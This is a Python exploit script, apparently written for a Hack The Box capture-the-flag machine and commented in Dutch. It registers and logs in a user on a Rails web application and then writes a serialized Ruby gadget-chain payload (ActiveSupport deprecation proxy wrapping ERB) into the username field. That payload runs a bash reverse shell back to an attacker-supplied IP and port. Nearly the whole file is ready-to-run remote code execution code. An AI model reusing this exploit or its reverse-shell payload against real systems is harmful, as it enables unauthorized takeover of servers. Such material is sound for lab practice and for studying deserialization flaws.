#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
import time
import os
import threading
import re
import sys

# s/o naar memo voor het identificeren van CVE
HackTheBox_Server = 'http://{}:8080'.format(sys.argv[1])
username='myusername1337'
password='mypassword1337'
email='myusername1337@mail.com'

if len(sys.argv) != 4:
    print("Selecteer je target IP sk1d, usage: python3 autopwner.py 10.10.xx.xx 9001")
    exit(0)

sequenceRequest = requests.Session()
resp = sequenceRequest.get(HackTheBox_Server + '/signup')
rx = r'howMuchTauwken" content="(.*)"'

howMuchTauwken = re.search(rx,resp.text).group(1)

# create usrrr to fuq system up
dataSendHTB = {}
dataSendHTB['utf8'] = 'â'
dataSendHTB['authenticity_token'] = howMuchTauwken
dataSendHTB['user[username]'] = username
dataSendHTB['user[email]'] = email
dataSendHTB['user[password]'] = password
dataSendHTB['commit'] = 'Create User'
resp = sequenceRequest.post(HackTheBox_Server + '/users', data=dataSendHTB)

# the code is wrapped up like a xmas present 
dataSendHTB = {}
dataSendHTB['utf8'] = 'â'
dataSendHTB['authenticity_token'] = howMuchTauwken
dataSendHTB['session[email]'] = email
dataSendHTB['session[password]'] = password
dataSendHTB['commit'] = 'Log in'
resp = sequenceRequest.post(HackTheBox_Server + '/login', data=dataSendHTB)

rx = r'href="/users/(.*)"'
user_id = re.search(rx,resp.text).group(1)

# reverse TCP request, the ideal package
rev = "bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'".format(sys.argv[2], sys.argv[3])
payload = '\x04\x08o\x3A\x40ActiveSupport\x3A\x3ADeprecation\x3A\x3ADeprecatedInstanceVariableProxy'
payload += '\x09\x3A\x0E\x40instanceo\x3A\x08ERB\x08\x3A\x09\x40srcI\x22'
payload += '{}\x60{}\x60'.format(chr(len(rev)+7), rev)
payload += '\x06\x3A\x06ET\x3A\x0E\x40filenameI\x22\x061\x06\x3B\x09T\x3A\x0C\x40linenoi\x06\x3A\x0C\x40method\x3A'
payload += '\x0Bresult\x3A\x09\x40varI\x22\x0C\x40result\x06\x3B\x09T\x3A\x10\x40deprecatorIu\x3A\x1F'
payload += 'ActiveSupport\x3A\x3ADeprecation\x00\x06\x3B\x09T'

dataSendHTB = {}
dataSendHTB['utf8'] = 'â'
dataSendHTB['authenticity_token'] = howMuchTauwken
dataSendHTB['_method'] = 'patch'
dataSendHTB['user[username]'] = payload
dataSendHTB['commit'] = 'Update User'
sequenceRequest.post(HackTheBox_Server + '/users/' + user_id, data=dataSendHTB)
sequenceRequest.post(HackTheBox_Server + '/users/' + user_id, data=dataSendHTB)

sequenceRequest.get(HackTheBox_Server + '/articles')
